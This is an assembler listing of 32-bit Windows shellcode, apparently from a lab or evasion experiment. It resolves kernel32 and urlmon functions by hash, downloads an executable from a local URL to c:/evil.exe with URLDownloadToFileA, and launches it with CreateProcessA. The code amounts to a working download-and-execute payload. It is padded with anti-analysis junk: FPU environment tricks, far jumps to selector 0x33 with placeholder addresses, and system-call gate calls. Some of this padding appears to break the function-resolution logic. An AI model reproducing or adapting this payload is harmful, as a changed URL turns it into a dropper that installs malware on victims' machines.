     1                                  [BITS 32]
     2                                  
     3                                  mainentrypoint:
     4                                  
     5 00000000 E800000000              call geteip
     6                                  geteip:
     7 00000005 5A                      pop edx ; EDX is now base for function
     8 00000006 8D52FB                  lea edx, [edx-5] ;adjust for first instruction?
     9                                  
    10 00000009 89E5                    mov ebp, esp
    11 0000000B 81EC00100000            sub esp, 1000h
    12                                  
    13 00000011 52                      push edx
    14 00000012 BB8EFE1F4B              mov ebx, 0x4b1ffe8e ; kernel32 hash
    15 00000017 E8BE000000              call get_module_address
    16 0000001C 5A                      pop edx
    17                                  
    18 0000001D 55                      push ebp
    19 0000001E 52                      push edx
    20 0000001F 89C5                    mov ebp, eax
    21                                  
    22 00000021 8DB2[70020000]          lea esi, [EDX + KERNEL32HASHTABLE] ;building kernel32 tables
    23 00000027 8DBA[7C020000]          lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
    24 0000002D E8FE000000              call get_api_address
    25 00000032 5A                      pop edx
    26 00000033 5D                      pop ebp
    27                                  
    28                                  ;calling LoadLibraryA in order to get access to urlmon apis
    29 00000034 55                      push ebp
    30 00000035 52                      push edx ; this value is vital, let's push it so we can get it back later
    31 00000036 8DB2[3A020000]          lea esi, [EDX + URLMON] ;ptr to string "urlmon.dll" -- loadlibrary will search for this filename and get it for us
    32 0000003C 56                      push esi
    33 0000003D FFB2[80020000]          push dword[EDX + KERNEL32_LOADLIBRARY]
    34 00000043 58                      pop eax
    35 00000044 FFD0                    call eax
    36 00000046 5A                      pop edx
    37 00000047 5D                      pop ebp
    38                                  
    39 00000048 90                       NOP
    40 00000049 90                      NOP  
    41 0000004A D9FA                    FSQRT
    42 0000004C 90                      NOP
    43 0000004D 90                      NOP
    44 0000004E D9742404                FNSTENV [ESP + 0x4]
    45                                  ;build urlmon table
    46 00000052 55                      push ebp
    47 00000053 52                      push edx 
    48 00000054 89C5                    mov ebp, eax
    49 00000056 8DB2[84020000]          lea esi, [EDX + URLMONHASHTABLE] ;same idea as building the kernel32 tables, we just didn't have it loaded before
    50 0000005C 8DBA[8C020000]          lea edi, [EDX + URLMONFUNCTIONSTABLE]
    51 00000062 E8C9000000              call get_api_address
    52 00000067 5A                      pop edx
    53 00000068 5D                      pop ebp
    54                                  
    55 00000069 9BD9710C                FSTENV [ECX + 0xc]
    56                                  
    57 0000006D D97507                  FNSTENV [EBP + 0x7]
    58                                  ;call dltofile - download an executable to be run 
    59 00000070 55                      push ebp
    60 00000071 52                      push edx
    61 00000072 6A00                    push 0x0 ;lpfnCB - can be NULL for our needs
    62 00000074 6A00                    push 0x0 ;dwReserved - must be NULL
    63 00000076 8DB2[45020000]          lea esi, [EDX + PATH]
    64 0000007C 56                      push esi ;szFileName - ptr to string containing destination on local machine for file
    65 0000007D 8DB2[51020000]          lea esi, [EDX + PUTTY_URL] 
    66 00000083 56                      push esi ;szURL - ptr to string containing URL to dl from. It seems this function doesn't perform DNS, so must provide an IP.
    67                                  		 ;currently using http://localhost:8080/calc.exe in order to download this file from a local SimpleHTTP server on port 8080.
    68 00000084 6A00                    push 0x0 ;pCaller - can be NULL for our needs
    69 00000086 FFB2[8C020000]          push dword[EDX + URLMON_URLDOWNLOADTOFILE]
    70 0000008C 58                      pop eax
    71 0000008D FFD0                    call eax ;call the function
    72 0000008F 5A                      pop edx
    73 00000090 5D                      pop ebp
    74                                  
    75 00000091 D9FA                    FSQRT
    76 00000093 90                      NOP
    77 00000094 90                      NOP 
    78 00000095 90                      NOP
    79 00000096 90                      NOP
    80 00000097 9BD9742404              FSTENV [ESP + 0x4]
    81                                  
    82                                  ;call CreateProcessA - time to run our downloaded program
    83 0000009C 55                      push ebp
    84 0000009D 52                      push edx
    85 0000009E 8DB2[90020000]          lea esi, [EDX + PROCESS_INFORMATION]
    86 000000A4 56                      push esi ;lpProcessInformation - we don't care about this but it wants a structure so we give it one
    87 000000A5 8DB2[A0020000]          lea esi, [EDX + STARTUPINFO]
    88 000000AB 56                      push esi ;lpStartupInfo - same deal as processinfo (why is this one abbreviated but the longer one isn't?)
    89 000000AC 6A00                    push 0x0 ;lpCurrentDirectory - NULL = same as caller
    90 000000AE 6A00                    push 0x0 ;lpEnvironment - see above
    91 000000B0 6A00                    push 0x0 ;dwCreationFlags - we don't need any of these
    92 000000B2 6A00                    push 0x0 ;bInheritHandles - FALSE = handles not inherited by new process. We don't need that
    93 000000B4 6A00                    push 0x0 ;lpThreadAttributes - NULL = returned handle can't be inherited, still don't care
    94 000000B6 6A00                    push 0x0 ;lpProcessAttributes - NULL... you get the idea
    95 000000B8 8DB2[45020000]          lea esi, [edx + PATH]
    96 000000BE 56                      push esi ;lpCommandLine - Command to be executed. This is our path to the executable we downloaded.
    97 000000BF 6A00                    push 0x0 ;lpApplicationName - NULL = first whitespace-delimited token in lpCommandLine. sounds good!
    98 000000C1 FFB2[7C020000]          push dword[EDX + KERNEL32_CREATEPROCESSA]
    99 000000C7 58                      pop eax
   100 000000C8 FFD0                    call eax ;launch our .exe!
   101 000000CA 5A                      pop edx
   102 000000CB 5D                      pop ebp
   103                                  
   104 000000CC C3                      ret
   105                                  
   106 000000CD D9EB                    FLDPI
   107 000000CF B842000000              MOV EAX,0x42
   108 000000D4 83C020                  ADD EAX, 0x20
   109 000000D7 9BD930                  FSTENV [EAX]
   110                                  ; returns module base in EAX
   111                                  ; EBP = Hash of desired module
   112                                  get_module_address:
   113                                  
   114                                  ;walk PEB find target module
   115 000000DA FC                      cld
   116 000000DB 31FF                    xor edi, edi
   117 000000DD 648B3D30000000          mov edi, [FS:0x30]
   118 000000E4 8B7F0C                  mov edi, [edi+0xC]
   119 000000E7 EB08                    jmp module_hash_loop
   120 000000E9 8B7F14                  mov edi, [edi+0x14]
   121                                  
   122                                  next_module_loop:
   123 000000EC 8B7728                  mov esi, [edi+0x28]
   124 000000EF 31D2                    xor edx, edx
   125                                  
   126                                  module_hash_loop:
   127 000000F1 66AD                    lodsw
   128 000000F3 84C0                    test al, al
   129 000000F5 7411                    jz end_module_hash_loop
   130 000000F7 3C41                    cmp al, 0x41
   131 000000F9 7206                    jb end_hash_check
   132 000000FB 3C5A                    cmp al, 0x5A
   133 000000FD 7702                    ja end_hash_check
   134 000000FF 0C20                    or al, 0x20
   135                                  
   136                                  end_hash_check:
   137 00000101 C1C207                  rol edx, 7
   138 00000104 30C2                    xor dl, al
   139 00000106 EBE9                    jmp module_hash_loop
   140                                  
   141                                  end_module_hash_loop:
   142 00000108 39DA                    cmp edx, ebx
   143 0000010A 8B4710                  mov eax, [edi+0x10]
   144 0000010D 8B3F                    mov edi, [edi]
   145 0000010F 31DB                    XOR EBX, EBX
   146 00000111 31C3                    XOR EBX, EAX
   147 00000113 6A26                    PUSH 0x26
   148 00000115 58                      pop eax
   149 00000116 31C9                    xor ecx,ecx
   150 00000118 53                      PUSH EBX
   151 00000119 64FF15C0000000          CALL DWORD [FS: 0xc0]
   152 00000120 89C1                    MOV ECX, EAX
   153 00000122 83E90B                  SUB ECX, 11
   154 00000125 51                      PUSH ECX
   155 00000126 64FF15C0000000          CALL DWORD [FS: 0xc0]
   156 0000012D 75BD                    jnz next_module_loop
   157 0000012F C3                      ret
   158                                  
   159                                  get_api_address:
   160 00000130 89EA                    mov edx, ebp
   161 00000132 03523C                  add edx, [edx+3Ch]
   162 00000135 8B5278                  mov edx, [edx+78h]
   163 00000138 01EA                    add edx, ebp
   164 0000013A 8B5A20                  mov ebx, [edx+20h]
   165 0000013D 6A13                    PUSH 0x13
   166 0000013F 59                      pop ecx
   167 00000140 B813000000              mov eax, 0x13
   168 00000145 01C8                    add eax, ecx
   169 00000147 64FF15C0000000          CALL DWORD [FS: 0xc0]
   170 0000014E 01EB                    add ebx, ebp
   171 00000150 31C9                    xor ecx, ecx
   172                                  
   173 00000152 50                      push eax
   174 00000153 C3                      ret
   175                                  
   176 00000154 E800000000              call callpop
   177                                  callpop:
   178 00000159 58                      pop eax
   179                                  
   180                                  
   181                                  load_api_hash:
   182 0000015A 57                      push edi
   183 0000015B 56                      push esi
   184 0000015C 8B36                    mov esi, [esi]
   185                                  ; Removed the next instruction, which caused the second API function not to resolve properly
   186                                  ; xor ecx, ecx
   187                                  
   188                                  load_api_name:
   189 0000015E 8B3B                    mov edi, [ebx]
   190 00000160 01EF                    add edi, ebp
   191 00000162 52                      push edx
   192 00000163 31D2                    xor edx, edx
   193                                  
   194                                  create_hash_loop:
   195 00000165 C1C207                  rol edx, 7
   196 00000168 3217                    xor dl, [edi]
   197 0000016A 47                      inc edi
   198 0000016B 803F00                  cmp byte [edi], 0
   199 0000016E 75F5                    jnz create_hash_loop
   200                                  
   201 00000170 52                      push edx
   202 00000171 C3                      ret
   203 00000172 68EFBEAFDE              push 0xdeafbeef
   204 00000177 6A33                    push 0x33
   205 00000179 CB                      retf
   206 0000017A 52                      push edx
   207 0000017B C3                      ret
   208 0000017C 53                      push ebx
   209 0000017D C3                      ret
   210 0000017E EA785634123300          jmp 0x33:0x12345678
   211 00000185 92                      xchg eax, edx
   212 00000186 5A                      pop edx
   213 00000187 39F0                    cmp eax, esi
   214 00000189 7419                    jz load_api_addy
   215 0000018B 83C304                  add ebx, 4
   216 0000018E 41                      inc ecx
   217 0000018F 394A18                  cmp [edx+18h], ecx
   218 00000192 75CA                    jnz load_api_name
   219 00000194 5E                      pop esi
   220 00000195 5F                      pop edi
   221 00000196 E800000000              call callpop_1
   222                                  callpop_1:
   223 0000019B 58                      pop eax
   224 0000019C 9A000031123300          call 0x33:0x12310000
   225 000001A3 C3                      ret
   226                                  
   227                                  load_api_addy:
   228 000001A4 5E                      pop esi
   229 000001A5 5F                      pop edi
   230 000001A6 AD                      lodsd
   231 000001A7 56                      push esi
   232 000001A8 648B6830                mov ebp, [FS:eax+0x30]
   233 000001AC 8B7F0C                  mov edi, [edi+0xC]
   234 000001AF 8B7F14                  mov edi, [edi+0x14]
   235 000001B2 AD                      lodsd
   236 000001B3 53                      push ebx
   237 000001B4 C3                      ret
   238 000001B5 6811111111              push 0x11111111
   239 000001BA 6A33                    push 0x33
   240 000001BC CB                      retf
   241 000001BD 52                      push edx
   242 000001BE C3                      ret
   243 000001BF EAEFBEADDE3300          jmp 0x33:0xdeadbeef
   244 000001C6 89EB                    mov ebx, ebp
   245 000001C8 89DE                    mov esi, ebx
   246 000001CA 035A24                  add ebx, [edx+24h]
   247 000001CD 8D044B                  lea eax, [ebx+ecx*2]
   248 000001D0 0FB700                  movzx eax, word [eax]
   249 000001D3 6A26                    PUSH 0x26
   250 000001D5 58                      pop eax
   251 000001D6 83C014                  add eax, 20
   252 000001D9 31DB                    XOR EBX, EBX
   253 000001DB 01C3                    ADD EBX, EAX
   254 000001DD 89DA                    MOV EDX, EBX
   255 000001DF 29C2                    SUB EDX, EAX
   256 000001E1 52                      PUSH EDX
   257 000001E2 9ADEC037133300          call 0x33:0x1337c0de
   258                                  
   259 000001E9 648B6830                mov ebp, [FS:eax+0x30]
   260 000001ED 8B7F0C                  mov edi, [edi+0xC]
   261 000001F0 8B7F1C                  mov edi, [edi+0x1c]
   262 000001F3 AD                      lodsd
   263                                  
   264 000001F4 648B6830                mov ebp, [FS:eax+0x30]
   265 000001F8 8B7F0C                  mov edi, [edi+0xC]
   266 000001FB 8B7F14                  mov edi, [edi+0x14]
   267 000001FE 8B3F                    mov edi, DWORD [EDI]
   268 00000200 8B3F                    mov edi, DWORD [EDI]
   269                                  
   270                                  
   271 00000202 64FF15C0000000          CALL DWORD [FS: 0xc0]
   272                                  
   273 00000209 8D0486                  lea eax, [esi+eax*4]
   274 0000020C 03421C                  add eax, [edx+1ch]
   275 0000020F 8B00                    mov eax, [eax]
   276 00000211 01F0                    add eax, esi
   277 00000213 AB                      stosd
   278 00000214 E80B000000              call callpop_2
   279 00000219 83C003                  add eax, 3
   280 0000021C 6800104000              push 0x401000
   281 00000221 6A33                    push 0x33
   282 00000223 CB                      retf
   283                                  callpop_2:
   284 00000224 5B                      pop ebx
   285 00000225 5B                      pop ebx
   286 00000226 53                      push ebx
   287 00000227 C3                      ret
   288 00000228 5E                      pop esi
   289 00000229 83C304                  add ebx, 4
   290 0000022C 41                      inc ecx
   291 0000022D 813EFFFF0000            cmp dword [esi], 0FFFFh
   292 00000233 0F8521FFFFFF            jnz load_api_hash
   293                                  
   294 00000239 C3                      ret
   295                                  
   296                                  
   297                                  URLMON:
   298 0000023A 75726C6D6F6E2E646C-     	db "urlmon.dll", 0
   298 00000243 6C00               
   299                                  
   300                                  PATH:
   301 00000245 633A2F6576696C2E65-     	db "c:/evil.exe", 0
   301 0000024E 786500             
   302                                  
   303                                  PUTTY_URL:
   304 00000251 687474703A2F2F3132-     	db "http://127.0.0.1:8080/calc.exe", 0
   304 0000025A 372E302E302E313A38-
   304 00000263 3038302F63616C632E-
   304 0000026C 65786500           
   305                                  
   306                                  KERNEL32HASHTABLE:
   307 00000270 C78A3146                	dd 0x46318ac7 ;CreateProcessA
   308 00000274 2680ACC8                	dd 0xc8ac8026 ;LoadLibraryA
   309 00000278 FFFF0000                	dd 0xFFFF ; make sure to end with this token
   310                                  
   311                                  KERNEL32FUNCTIONSTABLE:
   312                                  KERNEL32_CREATEPROCESSA:
   313 0000027C 01000000                	dd 0x00000001
   314                                  KERNEL32_LOADLIBRARY:	
   315 00000280 02000000                	dd 0x00000002
   316                                  
   317                                  
   318                                  
   319                                  URLMONHASHTABLE:
   320 00000284 99235DD9                	dd 0xd95d2399 ;URLDownloadToFileA
   321 00000288 FFFF0000                	dd 0xFFFF
   322                                  
   323                                  URLMONFUNCTIONSTABLE:
   324                                  URLMON_URLDOWNLOADTOFILE:
   325 0000028C 03000000                	dd 0x00000003
   326                                  
   327                                  PROCESS_INFORMATION: ;dummy PROCESS_INFORMATION structure for CreateProcessA
   328 00000290 00000000                	dd 0x00000000
   329 00000294 00000000                	dd 0x00000000
   330 00000298 00000000                	dd 0x00000000
   331 0000029C 00000000                	dd 0x00000000
   332                                  
   333                                  STARTUPINFO: ;dummy STARTUPINFO structure for CreateProcessA
   334 000002A0 00000000                	dd 0x00000000
   335 000002A4 00000000                	dd 0x00000000
   336 000002A8 00000000                	dd 0x00000000
   337 000002AC 00000000                	dd 0x00000000
   338 000002B0 00000000                	dd 0x00000000
   339 000002B4 00000000                	dd 0x00000000
   340 000002B8 00000000                	dd 0x00000000
   341 000002BC 00000000                	dd 0x00000000
   342 000002C0 00000000                	dd 0x00000000
   343 000002C4 00000000                	dd 0x00000000
   344 000002C8 00000000                	dd 0x00000000
   345 000002CC 00000000                	dd 0x00000000
   346 000002D0 0000                    	dw 0x0000
   347 000002D2 0000                    	dw 0x0000
   348 000002D4 00                      	db 0x0
   349 000002D5 00000000                	dd 0x00000000
   350 000002D9 00000000                	dd 0x00000000
   351 000002DD 00000000                	dd 0x00000000
   352                                  
   353                                  ExitProcess:
   354 000002E1 01000000                	dd 0x00000001
   355                                  
